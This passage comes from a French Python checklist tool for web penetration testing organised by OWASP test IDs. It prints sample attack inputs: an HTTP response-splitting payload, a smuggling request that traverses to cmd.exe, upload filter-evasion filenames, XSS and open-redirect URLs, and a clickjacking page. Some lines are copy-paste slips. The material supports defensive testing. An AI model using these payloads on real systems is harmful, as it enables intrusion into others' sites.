     print("Si panel d'administration accessible par utilisateur lambda : possible  d'injecter un WAR file capable de prendre la maib sur le serveur et d'ajouter une application malicieuse sur le site l�gitime (accessible par tous les utilisateurs)")

     outil()
     print("XSS-proxy; Burp ; Metasploit")

     conclusion()
     print("[OK] Si pas d'attaques persistantes.")
     print("[KO] Sinon.")

    def OTG_INPVAL_016(self):
     banniere("OTG INPVAL 016")
     objectif()
     print("Tester la possibilité de Splitting Smuggling :")
     print("HTTP splitting: Ajout de caractère CR et LF  (\%0d\%0a) dans les en-têtes pour diviser la requêtes en 2 reuêtes")
     print("Résultat : Cache poisoning ou XSS")
     print("HTTP Smugling: se servir du parsage de la requête par les différents agent (serveur web, proxy, pare-feu) pour provoquer des comportements inattendus.")

     test()
     print("[+] HTTP SPLITTING :")
     print("1. Cache poisoning : Si requête qui redirige un utilisateur vers une 'interface' spécifique")
     print("  HTTP/1.1 302 Moved Temporarily")
     print("  Date: Sun, 03 Dec 2005 16:22:19 GMT")
     print("  Location: http://victim.com/main.jsp?interface=advanced")
     print("  <snip>")
     print("=> Il est possible d'ajouter une séquence CRLF qui empoisonnera les utilisateurs se rendant sur le site.")
     print(" ajout des datas suvantes dans la requête précédente :")
     print("\n")
     print(" advanced\%0d\%0aContent-Length:\%200\%0d\%0a\%0d\%0aHTTP/1.1\%20200\%20OK\%0d\%0aContent-")
     print(" Type:%20text/html\%0d\%0aContent-Length:\%2035\%0d\%0a\%0d\%0a<html>Sorry,%20System%20Down</html>")
     print("\n")
     print("Retour:")
     print("  HTTP/1.1 302 Moved Temporarily")
     print("  Date: Sun, 03 Dec 2005 16:22:19 GMT")
     print("  Location: http://victim.com/main.jsp?interface=advanced")
     print(" Content-Length: 0")
     print("")
     print("  HTTP/1.1 200 OK")
     print("  Content-Type: text/html")
     print("  Content-Length: 35")
     print("")
     print("  <html>Sorry,%20System%20Down</html>")
     print("  <other data>")
     print("\n")

     print("2. Attaque similaire avec du XSS : la cible est l'application, les victimes sont les utilisateurs.")
     print(" En-têtes interessants : Location ; Set-Cookie")

     print("3. Grey Box : Modifier les paramètres GET par des POST et procédés de même.")
     print("\n")

     print("[+] HTTP SMUGLING : Contournement de pare-feu :")

     print("\n")
     print("POST /target.asp HTTP/1.1        <-- Request #1")
     print("Host: target")
     print("Connection: Keep-Alive")
     print("Content-Length: 49225")
     print("\%0d\%0a")
     print("<49152 bytes of garbage>")
     print("POST /target.asp HTTP/1.0        <-- Request #2")
     print("Connection: Keep-Alive")
     print("Content-Length: 33")
     print("\%0d\%0a")
     print("POST /target.asp HTTP/1.0        <-- Request #3")
     print("xxxx: POST /scripts/..\%c1\%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0   <-- Request #4")
     print("Connection: Keep-Alive")
     print("\%0d\%0a")
     print("\n")
     print("Dans cet exemple : la quatrième requête est envoyée au serveur en contournant le pare-feu.")

     
     conclusion()
     print("[OK] Si pas de HTTP SPLITTING et SMUGLING.")
     print("[KO] Sinon.")

    def OTG_INPVAL_017(self):
     banniere("OTG INPVAL 017")
     objectif()
     print("Vérification du management des requêtes entrantes et sortantes du point de vue client et serveur.")

     test()
     print("[+] Analyser les requêtes avec un proxy et inspecter les requêtes suspicieuses.")
     print("[+] Reverse Proxy sur le serveur web")
     print("[+] Port forwarding : suivi des trames à travers les ports")
     print("[+] Capture des trames réseau au niveau TCP")

     outil()
     print("Proxy : BURP ! or FIDLER (windows); CHARLES WEB DEBUGGING PROXY (linux)")
     print("Reverse Proxy : FIDLER ou CHARLES")
     print("Port Forwarding : Charles (SOCKS  PROXY)")
     print("TCP capture : Wireshark , TCPDUMP")
     print("Reverse Wireshark (création de trame TCP) : OSTINATO")

     conclusion()
     print("[N/A] En général ce point n'est pas applicable (accès au serveur web)")


    def OTG_INPVAL(self):
     os.system('clear')
     self.OTG_INPVAL_001()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_002()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_003()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_004()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_005()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_006()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_007()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_008()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_009()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_010()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_011()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_012()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_013()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_014()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_015()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_016()
     input("Appuyez sur une touche pour changer d'OTG INPVAL.")
     os.system('clear')
     self.OTG_INPVAL_017()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')


## OTG ERR

    def OTG_ERR_001(self):
     banniere("OTG ERR 001")
     objectif()
     print("Vérification des codes erreurs.")
     
     test()
     print("[+] - BURP : caractères malformés dans tous les champs")
     print("Tentative d'accès à des pages d'erreurs:")


     for domaine in self.__AllDomains:
          domaine.checkErrors(self.__MALFORMED_CARACS)

     print("=> Erreurs du serveur web ")
     print("=> Erreurs des applications ")
     print("=> Erreur de base de données")

     conclusion()
     print("[OK] Si pas d'erreurs système.")
     print("[KO] Sinon.")

    def OTG_ERR_002(self):
     banniere("OTG ERR 002")
     objectif()
     print("Vérification des traces systèmes / informations de debug.")
     
     test()
     print("----- BLACK BOX -----")
     print("Dans tous les formulaires :")
     print("[+] Ajout d'entrée malformées (voir liste all-attack.unix)")
     print("[+] Entrée nulle")
     print("[+] Entrée longue")
     print("[+] Tentative d'accès à des pages sans autorisation")
     print("[+] Contournement des applications")
     print(" => Burp Intruder => Liste all-attack-unix dans les paramètres")

     print("----- GREY BOX -----")
     print("[+] Entrée javascript: &lt;\% e.printStackTrace( new PrintWriter( out ) ) \%&gt; ")
     print("[+] Recherche fichier web.xml")

     for domaine in self.__AllDomains:
          domaine.reqGetHTTP(self.__DESCRIPTEUR,"OTG_ERR_002")
          domaine.reqGetHTTPS(self.__DESCRIPTEUR,"OTG_ERR_002")

     outil()
     print("Burp Intruder")

     conclusion()
     print("[OK] Si pas de présence de traces système.")
     print("[KO] Sinon.")

    def OTG_ERR(self):
     os.system('clear')
     self.OTG_ERR_001()
     input("Appuyez sur une touche pour changer d'OTG ERR.")
     os.system('clear')
     self.OTG_ERR_002()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear') 



## OTG CRYPST
    def OTG_CRYPST_001(self):
     banniere("OTG CRYPST 001")
     objectif()
     print("Vérification des chiffrements et du transport de données.")
     
     test()
     print("[+] Comment sont envoyées les données du formulaire d'authentification?")
     print("=> Si Canal HTTP (cad http://www.toto.fr/authentification) alors problème")
     print("[+] Testssl.sh : Recherche des chiffrements faibles")
     
     if os.path.isfile('/opt/testssl.sh/testssl.sh'):
        pass        
     else:
        os.system("cd /opt/ && git clone --depth 1 https://github.com/drwetter/testssl.sh.git")
     threads=[]
     for domaine in self.__AllDomains:
        t = threading.Thread(target=checkSSL, args=(domaine.getName(),))
        threads.append(t)
        t.start()

     for t in threads:
        t.join()          
          

     print("[+] Vérification des logiciels mis à jour / Cookie Secure flag / HSTS")
     print("   La présence de HTTP et HTTPS permettent d'intercepter du traffic ")
     print("   Les 2 protocoles sur une même page peut conduire à une fuite d'information")
     print("[+] Pour chaque site, vérifier que les certificats ne sont pas wildcard et non expirés.")


     conclusion()
     print("[OK] Si pas de présence de traces système.")
     print("[KO] Sinon.")

    def OTG_CRYPST_002(self):
     banniere("OTG CRYPST 002")
     objectif()
     print("Vérification de la fonction padding oracle. Cette fonctionnalité permet de déchiffrer et de chiffrer des données arbitraires sans connaissance de la clef de chiffrement.")

     test()
     print("[+] Utiliser l'outil Padbuster avec cookie (apt-get install padbuster) \n")

     outil()
     print("Bletchley, Padbuster, Padding Oracle Exploitation Tool (POET), Poracle, python-paddinoracle")

     conclusion()
     print("[OK] Si pas d'Oracle padding.")
     print("[KO] Sinon.")

    def OTG_CRYPST_003(self):
     banniere("OTG CRYPST 003")
     objectif()
     print("Vérification qu'aucune donnée n'est envoyée à travers un canal non sécurisé.")

     test()
     print("[+] Les données suivantes ne doivent pas être envoyé via cana HTTP :")
     print("- Numéro de société social")
     print("- Numéro de compte bancaire")
     print("- Passeport")
     print("- Information de santé ")
     print("- Information d'étudiant")
     print("- Numéro de carte de crédit et de débit")
     print("- Numéro de permis de conduire\n")
     print("[+] Si l'authentification se fait via HTTP\n")


     print("[+] Cookie sans le Secure flag à travers la HTTP\n")
     print("[+] Recherche des mots de passe dans les fichiers de configuration du serveur\n")

     conclusion()
     print("[OK] Si pas de données transmises à travers le canal HTTP.")
     print("[KO] Sinon.")


    def OTG_CRYPST_004(self):
     banniere("OTG CRYPST 004")
     objectif()
     print("Vérification qu'aucun hash ou algorithme de chiffrement faible n'est utilisé.")

     test()
     print("--- Vérification basique ---")
     print("=> Nessus AdvScan retourne les informations suivantes")
     print("[+] Si utilisation de AES128 ou AES256, le IV doit être aléatoire et imprévisible.")
     print("[+] Si utilisation RSA, le OAEP (Optimal Asymmetric encryption Padding) est recommandé")
     print("[+] Si RSA signature, PSS padding est recommandé")

     print("[+] Ne pas utiliser les algorithmes de chiffrements suivants: MD5, RC4, DES, Blowfish, SHA1. 1024-bit RSA or DSA, 160-bit ECDSA (elliptic curves), 80/112-bit 2TDEA (two key triple DES)^")
     print("[+] La clef de chiffrement doit être telle que :")
     print(" Key exchange: Diffie�Hellman key exchange with minimum 2048 bits")
     print(" Message Integrity: HMAC-SHA2")
     print(" Message Hash: SHA2 256 bits")
     print(" Assymetric encryption: RSA 2048 bits")
     print(" Symmetric-key algorithm: AES 128 bits")
     print(" Password Hashing: PBKDF2, Scrypt, Bcrypt")
     print(" ECDH/ECDSA: 256 bits")

     print("[+] Service SSH : CBC ne doit pas être utilisé.")

     outil()
     print("NESSUS ADV SCAN pour les protocoles SNMP, TLS et SSH")
     print("Static Code analysis : Klocwork, Fortify, Coverity et CheckMark")
    

     conclusion()
     print("[OK] Si aucun algo de chiffrement faible / de hashage n'est trouvé.")
     print("[KO] Sinon.")


    def OTG_CRYPST(self):
     os.system('clear')
     self.OTG_CRYPST_001()
     input("Appuyez sur une touche pour changer d'OTG CRYPST.")
     os.system('clear')
     self.OTG_CRYPST_002()
     input("Appuyez sur une touche pour changer d'OTG CRYPST.")
     os.system('clear')
     self.OTG_CRYPST_003()
     input("Appuyez sur une touche pour changer d'OTG CRYPST.")
     os.system('clear')
     self.OTG_CRYPST_004()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')


## OTG BUSLOGIC
    def OTG_BUSLOGIC_001(self):
     banniere("OTG BUSLOGIC 001")
     objectif()
     print("Vérification des données envoyées par l'utilisateur dans une logique métier.")

     test()
     print("[+] Si ajout d'un numéro de sécurité social, le BVA (Boundary Value analysis) vérifie qu'il n'y à que 10 digits. Mais la carte est-elle existante dans ce cas là?")
     print("[+] Valider les entrées utilisateurs")
     print("[+] Tentative d'énumérations des noms de compte / de deviner les noms de comptes (OTG-IDENT-004)")
     print("[+] Tentative de contournement du schéma de session (OTG-SESS-001)")
     print("[+] Tentative d'exposition des variables de sessions (OTG-SESS-004)")

     conclusion()
     print("[OK] Si les infos envoyées sont envoyées dans une logique métier.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_002(self):
     banniere("OTG BUSLOGIC 002")
     objectif()
     print("Vérifier la capacité à forger des requêtes - HTTP POST/GET.")

     test()
     print("[+] Recherche de fonctions non légitimes (en les devinant, si elles sont prévisibles à l'avance, ou même normalement caché de l'utilisateur.)")
     print("=> Ajout de données non légitimes d'un point de vue business (ex : changer un module)")
     print("[+] BURP PROXY : tentative de modification d'ID (ex: ID=1)")
     print("[+] BURP PROXY : tenter d'activer / de désactiver les options de debug avec des requêtes HTTP")

     conclusion()
     print("[OK] Si pas possible de changer le flux métier grâce à des requêtes forgées..")
     print("[KO] Sinon.")


    def OTG_BUSLOGIC_003(self):
     banniere("OTG BUSLOGIC 003")
     objectif()
     print("Vérifier qu'il n'est pas possible d'injecter des données dans les champs hidden ou non légitimes")

     test()
     print("[+] BURP PROXY : Editer les requêtes; ajout d'éléments (non légitimes) depuis un compte d'un autre utilisateur.")
     print("[+] BURP PROXY : Un utilisateur ne doit pas pouvoir accéder à des contenus protégés (non autorisé en lecture, écriture et suppression)")
     print("[+] BURP PROXY : Tenter d'insérer, mettre à jour, éditer ou supprimer des infos concernant des données malformées sur chaque composant par un utilisateur non autorisé.")
     print("    => BURP INTRUDER dans tous les champs en changeant le cookie / identifiant")
     
     outil()
     print("BURP")

     conclusion()
     print("[OK] S'il n'est pas possible d'injecter des données dans les champs hidden.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_004(self):
     banniere("OTG BUSLOGIC 004")
     objectif()
     print("Vérification du temps de réponse d'un site (serveur). Les utilisateurs malveillants peuvent manipuler le process de fonctionnement en gardant de multiples sessions actives / ne pas correspondre au bon fonctionnement de l'application d'un point de vue temporel.")

     test()
     print("[+] L'ajout d'un faux identifiant/mdp modifie-t-il le timeout du site?")
     print("=> Sans accéder à un msg d'erreur ou GUI message, il est possible d'obtenir l'information.")
     print("[+] AGENCE DE VOYAGE : Si l'utilisateur réserve plusieurs sièges mais ne paye pas - que ce passe-t-il? ")
     print("=> Les sièges doivent être remis à la vente 15 minutes après.")
     print("[+] Si des transactions s'effectuent en fonction de l'heure (exemple du trading, moins cher le matin + cher le soir)")
     print("=> Un attaquant se connecte, fait un placement le matin mais attend le soir pour envoyer sa demande. Quel est la réaction du site?")


     conclusion()
     print("[OK] Si aucune prédiction n'est possible.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_005(self):
     banniere("OTG BUSLOGIC 005")
     objectif()
     print("Test du nombre de fois où il est possible d'utiliser une fonction.")

     test()
     print("[+] Si une réduction est présente sur un site d'e-commerce, si l'utilisateur l'utilise et retourne en arrière, peut-il l'utiliser de nouveau?")
     print("[+] En lien : Pas possible d'énumérer les comptes utilisateurs ou non devinables - OTG-IDENT-004")
     print("[+] En lien : Faible mécanisme de login out - OTG-AUTHN-003")


     conclusion()
     print("[OK] Si une fonction ne peut pas être utilisée de manière abusive.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_006(self):
     banniere("OTG BUSLOGIC 006")
     objectif()
     print("Contournement du workflow de l'application d'un point de vue métier.")

     test()
     print("[+] Les points cadeaux ajoutés lors de l'achat d'un objet sur un site e-commerce sont-ils bien supprimés si l'objet n'est pas acheté?")
     print("[+] Les mots \"blacklistés\" ne doivent pas pouvoir être ajoutés lors de l'edit d'un article.")

     conclusion()
     print("[OK] Si pas de contournement du workflow métier.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_007(self):
     banniere("OTG BUSLOGIC 007")
     objectif()
     print("Identification des mécanismes de protection - alerte.")

     test()
     print("[+] Essayer d'accéder à un fichier par son ID ; modifier l'ID par un ' ; Altérer la requête GET par un POST ; Ajout de paramètres supplémentaires ; Duppliquer un paramètre name/value")
     print("=> Ce comportement est celui d'un attaquant : Suite à ça, un mécanisme de défense doit opérer.")
     print("[+] Changement du user-agent")
     print("[+] BURP INTRUDER dans tous les formulaires")

     outil()
     print("BURP INTRUDER")

     conclusion()
     print("[OK] Si mécanisme qui détectent le comportement d'un attaquant.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_008(self):
     banniere("OTG BUSLOGIC 008")
     objectif()
     print("Vérification des extensions fichiers")

     test()
     print("[+] Tentative d'ajout de fichiers de type html, js, php ou .exe")
     print("[+] Regarder où s'opère la sécurité de l'inclusion de fichiers : coté front ou end?")
     print("[+] Le type de fichier est-il uniquement fait grâce au header \"Content-Type\"")
     print("[+] La vérification se fait-elle uniquement à travers l'extension?")
     print("[+] Est-il possible d'accéder aux fichiers inclus uniquement depuis leur lien URL ?")
     print("[+] Est-il possible d'inclure un fichier ZIP avec un path spécifique qui une fois unzip se déplace dans le site (ex zip ../../../files)")
     
     conclusion()
     print("[OK] Si les extensions fichiers sont légitimes et que la vérifiation se fait côté client et côté serveur.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC_009(self):
     banniere("OTG BUSLOGIC 009")
     objectif()
     print("Vérification qu'il n'est pas possible d'ajouter un script malicieux.")

     test()
     print("[+] S'il est possible d'ajouter une photo (.gif ou .jpg) => est-il possible d'inclure un shell php, exe ou virus?")
     print("=> Tentative d'ajout de script php : `echo \"<?php echo '<p>Hello World!</p>'; ?>\"")
     print("=> Le fichier doit être rejeté.")
     print("=> Si de multiples inclusions sont possibles, vérifier que le même process opère sur chaque fichier.")
     print("\n")
     print("[+] Evasion du filtre")
     print("=> Changer le 'Content-Type' par 'image/jpeg' dans la requête HTTP.")
     print("=> Changement de l'extension par des extensions d'executables : file.php5 ; file.shtml ; file.asa ; file.jpg ; file.jpsx ; file.aspx ; file.asp ; file.phtml")
     print("=> Changer les extensions fichiers avec des majuscules")
     print("=> Ajout de caractères spéciaux : file.asp...  file.php;jpg , file.asp%00.jpg , 1.jpg%00.php")

     print("\n")
     print("Sur IIS6 : file.asp;file.jpg est exécuté en tant que file.asp")
     print("Sous NGINX : l'inclusion de test.jpg/x.php sera executé comme x.php")

     conclusion()
     print("[OK] S'il n'est pas possible d'ajouter un script malicieux.")
     print("[KO] Sinon.")

    def OTG_BUSLOGIC(self):
     os.system('clear')
     self.OTG_BUSLOGIC_001()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_002()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_003()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_004()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_005()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_006()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_007()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_008()
     input("Appuyez sur une touche pour changer d'OTG BUSLOGIC.")
     os.system('clear')
     self.OTG_BUSLOGIC_009()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')

## OTG CLIENT
    def OTG_CLIENT_001(self):
     banniere("OTG CLIENT 001")
     objectif()
     print("Cette vulnérabilité est équivalente à la vulnérabilité XSS : la seule modification est le moyen de livraison de la charge.")
     print("Une XSS s'effectue côté client et s'execute sur le navigateur d'une victime. Une DOM based XSS controle le flux du code en utilisant les élements \"Document Object Model (DOM)\" créé par l'attaquant pour contrôler le flux.")
     print("Une XSS est envoyée au serveur et au navigateur client / une DOM XSS n'a pas de lien avec le serveur : l'interaction est dûe uniquement avec l'utilisateur.")

     conclusion()
     print("[OK] S'il n'y à pas de présence de DOM based XSS")
     print("[KO] Sinon.")

    def OTG_CLIENT_002(self):
     banniere("OTG CLIENT 002")
     objectif()
     print("Vérification de l'execution des scripts javascript")

     test()
     print("[+] Les champs javascript ne sont pas validés ou encodés")
     
     conclusion()
     print("[OK] S'il n'est pas possible de déjouer une variable JavaScript")
     print("[KO] Sinon.")


    def OTG_CLIENT_003(self):
     banniere("OTG CLIENT 003")
     objectif()
     print("Vérification de l'injection HTML")

     test()
     print("[+] Les champs javascript ne sont pas validés ou encodés")
     print(" - Présence de la fonction innerHTML : document.getElementById(\"Welcome\").innerHTML=\" Hello, \"+user;")
     print(" - Présence de la fonction document.write() : document.write(\"<h1>Hello, \" + user +\"</h1>\");")
     print(" La page http://vulnerable.site/page.html?user=<img\%20src='aaa'\%20onerror=alert(1)> executera une charge javasript dans un contexte html.")     
     
     conclusion()
     print("[OK] S'il n'est pas possible d'executer du code html")
     print("[KO] Sinon.")


    def OTG_CLIENT_004(self):
     banniere("OTG CLIENT 004")
     objectif()
     print("Vérification de la redirection ou OpenRedirect")
     print("Cette vuln permet une attaque par phishing ou la redirection d'une victime vers une page infectée.")

     test()
     print("[+] Les fonctions a regarder :")
     print(" - Présence de la fonction windows.location:  window.location='http://'+decodeURIComponent(redir); ")
     print(" La page http://www.victim.site/?#www.malicious.site executera une OpenRedirect.")     
     
     conclusion()
     print("[OK] S'il n'y à pas d'OPenRedirect")
     print("[KO] Sinon.")

    def OTG_CLIENT_005(self):
     banniere("OTG CLIENT 005")
     objectif()
     print("Vérification de l'injection CSS")
     print("Cette vuln peut modifier l'UI de la victime, executer une XSS ou divlguer des informations sensibles.")

     test()
     print("[+] Les fonctions a regarder :")
     print(" - Présence de la fonction css.Text :  document.getElementById(\"a1\").style.cssText = \"color: \" + location.hash.slice(1);")
     print(" - Présence d'un GET color en php : color: <?php echo $_GET['color']; ?>; ")
     print(" La page http://www.victim.site/?#www.malicious.site executera une OpenRedirect.")     
     
     conclusion()
     print("[OK] S'il n'y a pas  d'injection CSS")
     print("[KO] Sinon.")

    def OTG_CLIENT_006(self):
     banniere("OTG CLIENT 006")
     objectif()
     print("Vérification de la manipulation utilisateur")
     print("Si les entrées utilisateurs permettent de controler le chemin d'une ressource (la source d'une iframe, js, applet, ou un handler d'un XMLHttpRequest) .")

     test()
     print("[+] A tester de maniere similaire a l'injection css ")   
     
     conclusion()
     print("[OK] S'il n'y a pas possibilité de manipuler le chemin où seront stocker les fichers")
     print("[KO] Sinon.")

    def OTG_CLIENT_007(self):
     banniere("OTG CLIENT 007")
     objectif()
     print("Vérification du mécanisme CORS : Cross Origin Ressource Sharing")
     print("Mettre en place des requêtes cross-domain en utilisant le XMLHttpRequest L2 API")
     print("")
     print("[+] Plusieurs headers important :")   
     print(" - Header (Requête) Origin : l'origine de la requête")
     print(" - Header (Réponse) Access-Control-Allow-Origin : Quels sont les domaines autorisés à lire la réponse du serveur")
     print("    Si Access-Control-Allow-Origin = * tous les domaines sont autorisés => non sécurisé et ne devrait jamais être comme ça (à part pour des api public)")
     print(" - Header (Requête) Access-Control-Request-Method : OPTIONS")
     print(" - Header (Réponse) Access-Control-Allow-Method : méthode autorisées par le client")
     print(" - Header (Requête) Access-Control-Request-Headers : Quels sont les headers utilisés pour une requête de type cors")
     print(" - Header (Réponse) Access-Control-Allow-Headers : Quels sont les headers utilisés pour une requête de type cors")

     test()
     print("[=>] Regarder la réponses de OTG CONFIG 008 (Changement de l'origine, on voit si on peut accéder aux ressources ou non)")
     
     conclusion()
     print("[OK] Si pas de mauvaise configuration du CORS")
     print("[KO] Sinon.")
    
    def OTG_CLIENT_008(self):
     banniere("OTG CLIENT 008")
     objectif()
     print("Cross Site Flashing")
     print("Décompilation de l'application Flash et recherche de méthodes obsolètes / xss / redirector")

     test()
     print("[+] Comment décompiler :")   
     print(" - Utiliser l'outil flare : flare hello.swf")
     print("[+] Méthodes non sécurisées :")    
     print(" - loadVariables()")
     print(" - loadMovie()")
     print(" - getURL()")
     print(" - loadMovie()")
     print(" - loadMovieNum()")
     print(" - FScrollPane.loadScrollContent()")
     print(" - LoadVars.load ")
     print(" - LoadVars.send ")
     print(" - XML.load ( 'url' )")
     print(" - LoadVars.load ( 'url' )")
     print(" - Sound.loadSound( 'url' , isStreaming ); ")
     print(" - NetStream.play( 'url' );")
     print(" - flash.external.ExternalInterface.call(_root.callback) ")
     print("[+] Vulnérabilités possibles :") 
     print(" - XSS ")
     print(" - Open redirectors : http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html")
     print(" - Nombreuses vulnérabilités dans les versions antérieures ")

     conclusion()
     print("[OK] Si pas d'application swf")
     print("[KO] Si problèmes avec cette appli.")

    def OTG_CLIENT_009(self):
     banniere("OTG CLIENT 009")
     objectif()
     print("Clickjacking")
     print("Décompilation de l'application Flash et recherche de méthodes obsolètes / xss / redirector")

     test()
     print("[+] Utiliser Burp Pro , naviguer sur le site (crawl) :")   
     print(" -  Burp repère les pages avec des clickjacking, disons que cette page se trouve à l'adresse http://www.target.site")
     print("[+] Une fois la page detectée, ajout du code suivant dans la page /var/www/index.html :")   
     print("") 
     print("<html>")
     print("<head>")
     print("<title>Clickjack test page</title>")
     print("</head>")
     print("<body>")
     print("<p>Website is vulnerable to clickjacking!</p>")
     print("<iframe src=\"http://www.target.site\" width=\"500\" height=\"500\"></iframe>")
     print("</body>")
     print("</html> ")
     print("")
     print("[+] lancement du service nginx : service start nginx")
     print("[+] Ouvrir son navigateur à la page localhost:80 et voir si l'image du site est bien présente ou non")

     outil()
     print("BURP")

     conclusion()
     print("[OK] Si pas de clickjacking")
     print("[KO] Sinon")

    def OTG_CLIENT_010(self):
     banniere("OTG CLIENT 010")
     objectif()
     print("Web Socket")
     print("WebSocket est un protocole comme HTTP permettant de dialoguer avec des serveurs.")
     print("WS est l'équivalent de HTTP et WSS de HTTPS. WS et WSS permettent des discussions asynchrones très rapides entre les entités.")

     test()
     print("[+] Regarder si le site utilise des websocket (code source, commentaires, dossiers)")   
     print("[+] Burp permet de modifier les WS en temps réel (mais pas de Repeater, Scanner ou d'Intruder) repère les pages avec des clickjacking, disons que cette page se trouve à l'adresse http://www.target.site")
     print("")
     print("Référence : https://www.blackhillsinfosec.com/how-to-hack-websockets-and-socket-io/")
     outil()
     print("BURP")

     conclusion()
     print("[OK] Si pas de websocket")
     print("[KO] Sinon")

    def OTG_CLIENT_011(self):
     banniere("OTG CLIENT 011")
     objectif()
     print("Web Messaging ou Cross Document Messaging ")
     print("Ce système autorise des applications sur des domaines différents de communiquer d'une manière sécurisée.")

     test()
     print("[+] Tentative de changement d'origine : si Access-Control-Allow-Origin : * (tous les domaines sont autorisés = bad)")   
     print("[+] Si www.owasp.org , chat.owasp.org ou forums.owasp.org accepté, regarder si www.owasp.attacker.com fonctionne")
     outil()
     print("BURP")

     conclusion()
     print("[OK] Si pas de CDM")
     print("[KO] Sinon")

    def OTG_CLIENT_012(self):
     banniere("OTG CLIENT 012")
     objectif()
     print(" Test local storage ")

     test()
     print("[+] Se rendre sur le site / depuis le navigateur faire F12 puis Stockage => local storage (stockage local)")   
     print("    Aucune information sensible ne doit être identifiée à cet endroit - c'est un stockage permanent (qui ne se supprime pas à la fin de la session)")
     print("[+] sessionStorage contient les variables de sessions et sera remis à zéro une fois la session terminée.")
     outil()
     print("Navigateur")

     conclusion()
     print("[OK] Si pas de pb de stockage")
     print("[KO] Sinon")


    def OTG_CLIENT():
     os.system('clear')
     self.OTG_CLIENT_001()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_002()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_003()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_004()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_005()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_006()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_007()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_008()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_009()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')
     self.OTG_CLIENT_010()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_011()
     input("Appuyez sur une touche pour changer d'OTG CLIENT.")
     os.system('clear')
     self.OTG_CLIENT_012()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')



    ## RECOMMANDATIONS 

    def RECOMMANDATIONS(self):
     while True:
            os.system('clear')
            affichageRECO()
            try:
                number=demandeOTG()
                os.system('clear')
            except :
                pass

            if number == "0":
                self.RECOMMANDATIONS_0()
                input("Appuyez sur une touche pour changer de recommandation additionnelle.")

            elif number == "1":
                self.RECOMMANDATIONS_1()
                input("Appuyez sur une touche pour changer de recommandation additionnelle.")

            elif number == "r" or number == "R" :
                break

            else:
                print_red("Je n'ai pas compris votre choix")
    
    def RECOMMANDATIONS_0(self):
     banniere("EN TETES HTTP")
     objectif()
     print("Vérifications des en-têtes HTTP : ")
     print("Content-Security-Policy : Protection contre l'ajout de script externe")
     print("Referrer-Policy : Valide les informations transmises via le referrer")
     print("X-Content-Type-Options : protection contre une execution de code via mime type")
     print("X-Frame-Options : Protection contre le clickjacking ")
     print("X-Permitted-Cross-Domain-Policies : Protection auteur XML")
     print("(Obsolète) X-XSS-Protection : Protection contre les XSS")

     test()
     for domaine in self.__AllDomains:
